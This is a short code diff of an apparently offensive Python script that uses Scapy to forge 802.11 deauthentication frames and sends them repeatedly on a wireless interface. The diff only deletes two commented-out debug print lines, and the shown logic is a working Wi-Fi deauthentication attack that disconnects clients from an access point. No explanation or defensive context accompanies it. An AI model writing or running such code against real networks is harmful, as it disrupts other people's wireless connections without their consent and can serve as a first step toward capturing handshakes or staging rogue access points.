@@ -34,10 +34,8 @@ while(True):
         print("Error")
         break
 
-    #print(packet.pdfdump())
     dot11 = Dot11(addr1=dst, addr2=src, addr3=bssid)
     packet = RadioTap()/dot11/Dot11Deauth(reason=codeReason)
 
     for n in range(int(deauthNumber)):
         sendp(packet, iface=interface)
-        #print(f"Deauth sent via: {conf.iface} to BSSID: {bssid} for Client: {client}")
